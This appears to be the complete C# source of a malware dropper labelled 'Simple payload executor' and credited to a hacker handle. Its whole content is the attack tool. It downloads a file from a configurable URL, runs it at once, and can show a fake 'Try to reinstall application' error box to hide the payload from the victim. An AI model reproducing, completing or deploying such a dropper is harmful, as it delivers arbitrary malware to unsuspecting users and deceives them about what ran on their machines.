/*
Simple payload executor
Coded by ToxidWorm
 */

using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Diagnostics;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace PayloadEXEC
{
    class Program
    {

        public static string URLToDownload = "";
        public static string OutputFilename = "";
        public static bool MessageBoxEnabled = false /*Make false to disable true to enable*/;
        public static string MessageBoxTitle = "Error!";
        public static string MessageBoxMessage = "Can't run program!\nTry to reinstall application!";
        static void Main(string[] args)
        {
            WebClient webClient = new WebClient();
            webClient.DownloadFile($"{URLToDownload}", $"{OutputFilename}");
            Process.Start($"{OutputFilename}");
            if (MessageBoxEnabled) {
                MessageBox.Show(MessageBoxMessage, MessageBoxTitle, 0, MessageBoxIcon.Error);
            }
        }
    }
}
